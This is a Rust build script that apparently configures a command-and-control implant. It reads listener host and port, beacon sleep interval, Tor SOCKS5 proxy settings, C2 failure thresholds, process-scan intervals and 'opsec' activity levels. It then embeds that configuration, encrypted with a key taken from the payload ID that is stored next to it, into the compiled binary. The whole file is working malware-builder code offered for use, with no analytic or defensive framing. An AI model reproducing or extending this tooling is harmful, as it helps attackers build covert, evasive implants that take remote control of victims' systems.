use std::env;
use std::fs;
use std::path::Path;

// --- AES Encryption Logic ---
#[cfg(feature = "encryption-aes")]
fn encrypt_config(config_json: &str, payload_id: &str) -> (Vec<u8>, String) {
    use aes_gcm::aead::{Aead, AeadCore, KeyInit, OsRng};
    use aes_gcm::{Aes256Gcm, Key};

    let mut key_material = [0u8; 32];
    let id_bytes = payload_id.as_bytes();
    let len = id_bytes.len().min(32);
    key_material[..len].copy_from_slice(&id_bytes[..len]);
    let key = Key::<Aes256Gcm>::from_slice(&key_material);

    let cipher = Aes256Gcm::new(key);
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
    let ciphertext = cipher.encrypt(&nonce, config_json.as_bytes()).expect("AES encryption failed");

    let mut encrypted_data = nonce.to_vec();
    encrypted_data.extend_from_slice(&ciphertext);
    (encrypted_data, payload_id.to_string())
}

// --- ChaCha20 Encryption Logic ---
#[cfg(feature = "encryption-chacha")]
fn encrypt_config(config_json: &str, payload_id: &str) -> (Vec<u8>, String) {
    use chacha20poly1305::aead::{Aead, AeadCore, KeyInit, OsRng};
    use chacha20poly1305::{ChaCha20Poly1305, Key};

    let mut key_material = [0u8; 32];
    let id_bytes = payload_id.as_bytes();
    let len = id_bytes.len().min(32);
    key_material[..len].copy_from_slice(&id_bytes[..len]);
    let key = Key::from_slice(&key_material);

    let cipher = ChaCha20Poly1305::new(key);
    let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
    let ciphertext = cipher.encrypt(&nonce, config_json.as_bytes()).expect("ChaCha20 encryption failed");

    let mut encrypted_data = nonce.to_vec();
    encrypted_data.extend_from_slice(&ciphertext);
    (encrypted_data, payload_id.to_string())
}

fn log_build(msg: &str) {
    println!("[BUILD] {}", msg);
}

fn main() {
    log_build("Build script started");
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=config.json");
    println!("cargo:rerun-if-env-changed=LISTENER_HOST");
    println!("cargo:rerun-if-env-changed=LISTENER_PORT");
    println!("cargo:rerun-if-env-changed=SLEEP_INTERVAL");
    println!("cargo:rerun-if-env-changed=PAYLOAD_ID");
    println!("cargo:rerun-if-env-changed=PROTOCOL");
    println!("cargo:rerun-if-env-changed=SOCKS5_ENABLED");
    println!("cargo:rerun-if-env-changed=SOCKS5_HOST");
    println!("cargo:rerun-if-env-changed=SOCKS5_PORT");
    println!("cargo:rerun-if-env-changed=BASE_MAX_C2_FAILS");
    println!("cargo:rerun-if-env-changed=C2_THRESH_INC_FACTOR");
    println!("cargo:rerun-if-env-changed=C2_THRESH_DEC_FACTOR");
    println!("cargo:rerun-if-env-changed=C2_THRESH_ADJ_INTERVAL");
    println!("cargo:rerun-if-env-changed=C2_THRESH_MAX_MULT");
    println!("cargo:rerun-if-env-changed=PROC_SCAN_INTERVAL_SECS");
    println!("cargo:rerun-if-env-changed=BASE_SCORE_THRESHOLD_BG_TO_REDUCED");
    println!("cargo:rerun-if-env-changed=BASE_SCORE_THRESHOLD_REDUCED_TO_FULL");
    println!("cargo:rerun-if-env-changed=REDUCED_ACTIVITY_SLEEP_SECS");

    let config_json = if env::var("PAYLOAD_ID").is_ok() {
        // Get configuration from environment variables
        let server_host = env::var("LISTENER_HOST").unwrap_or_default();
        let server_port = env::var("LISTENER_PORT").unwrap_or_default();
        let sleep_interval = env::var("SLEEP_INTERVAL").unwrap_or_else(|_| "60".to_string());
        let payload_id = env::var("PAYLOAD_ID").unwrap_or_default();
        let protocol = env::var("PROTOCOL").unwrap_or_else(|_| {
            if server_port == "443" {
                "https".to_string()
            } else {
                "http".to_string()
            }
        });
        let socks5_enabled = env::var("SOCKS5_ENABLED")
            .unwrap_or_else(|_| "false".to_string())
            .parse::<bool>()
            .unwrap_or(false);
        let socks5_host = env::var("SOCKS5_HOST").unwrap_or_else(|_| "127.0.0.1".to_string());
        let socks5_port = env::var("SOCKS5_PORT").unwrap_or_else(|_| "9050".to_string());

        log_build(&format!("LISTENER_HOST: {}", server_host));
        log_build(&format!("LISTENER_PORT: {}", server_port));
        log_build(&format!("SLEEP_INTERVAL: {}", sleep_interval));
        log_build(&format!("PAYLOAD_ID: {}", payload_id));
        log_build(&format!("PROTOCOL: {}", protocol));
        log_build(&format!("SOCKS5_ENABLED: {}", socks5_enabled));
        log_build(&format!("SOCKS5_HOST: {}", socks5_host));
        log_build(&format!("SOCKS5_PORT: {}", socks5_port));

        // Only use environment config if we have all required values
        if !server_host.is_empty() && !server_port.is_empty() && !payload_id.is_empty() {
            log_build("Using environment variables for config");
            let base_score_bg_reduced_thresh = env::var("BASE_SCORE_THRESHOLD_BG_TO_REDUCED").unwrap_or_else(|_| "20.0".to_string());
            let base_score_reduced_full_thresh = env::var("BASE_SCORE_THRESHOLD_REDUCED_TO_FULL").unwrap_or_else(|_| "60.0".to_string());
            let min_full_opsec = env::var("MIN_FULL_OPSEC_SECS").unwrap_or_else(|_| "300".to_string());
            let min_bg_opsec = env::var("MIN_BG_OPSEC_SECS").unwrap_or_else(|_| "60".to_string());
            let base_max_c2_fails = env::var("BASE_MAX_C2_FAILS").unwrap_or_else(|_| "5".to_string());
            let min_reduced_opsec = env::var("MIN_REDUCED_OPSEC_SECS").unwrap_or_else(|_| "120".to_string());
            let reduced_activity_sleep = env::var("REDUCED_ACTIVITY_SLEEP_SECS").unwrap_or_else(|_| "120".to_string());
            let c2_inc_factor = env::var("C2_THRESH_INC_FACTOR").unwrap_or_else(|_| "1.1".to_string());
            let c2_dec_factor = env::var("C2_THRESH_DEC_FACTOR").unwrap_or_else(|_| "0.9".to_string());
            let c2_adj_interval = env::var("C2_THRESH_ADJ_INTERVAL").unwrap_or_else(|_| "3600".to_string());
            let c2_max_mult = env::var("C2_THRESH_MAX_MULT").unwrap_or_else(|_| "2.0".to_string());
            let proc_scan_interval = env::var("PROC_SCAN_INTERVAL_SECS").unwrap_or_else(|_| "300".to_string());

            format!(
                r#"{{
                    "server_url": "{}:{}",
                    "sleep_interval": {},
                    "jitter": 2,
                    "payload_id": "{}",
                    "protocol": "{}",
                    "socks5_enabled": {},
                    "socks5_host": "{}",
                    "socks5_port": {},
                    "base_max_consecutive_c2_failures": {},
                    "min_duration_reduced_activity_secs": {},
                    "reduced_activity_sleep_secs": {},
                    "c2_failure_threshold_increase_factor": {},
                    "c2_failure_threshold_decrease_factor": {},
                    "c2_threshold_adjust_interval_secs": {},
                    "c2_dynamic_threshold_max_multiplier": {},
                    "proc_scan_interval_secs": {},
                    "base_score_threshold_bg_to_reduced": {},
                    "base_score_threshold_reduced_to_full": {},
                    "min_duration_full_opsec_secs": {},
                    "min_duration_background_opsec_secs": {}
                }}"#,
                server_host, server_port, sleep_interval, payload_id, protocol,
                socks5_enabled, socks5_host, socks5_port,
                base_max_c2_fails, min_reduced_opsec, reduced_activity_sleep,
                c2_inc_factor, c2_dec_factor, c2_adj_interval, c2_max_mult,
                proc_scan_interval,
                base_score_bg_reduced_thresh, base_score_reduced_full_thresh,
                min_full_opsec, min_bg_opsec
            )
        } else {
            log_build("Required environment variables are not set, falling back to config.json or default config");
            String::new() // Indicate to fall back to file-based config
        }
    } else {
        fs::read_to_string("config.json").expect("config.json not found")
    };

    let payload_id = env::var("PAYLOAD_ID").expect("PAYLOAD_ID must be set for encryption");

    let (encrypted_data, config_key) = encrypt_config(&config_json, &payload_id);

    let out_dir = env::var("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("config.rs");

    fs::write(
        &dest_path,
        format!(
            "static ENCRYPTED_CONFIG: &[u8] = &{:?};\nstatic CONFIG_KEY: &str = \"{}\";",
            encrypted_data, config_key
        ),
    ).unwrap();

    log_build("Build script finished");
}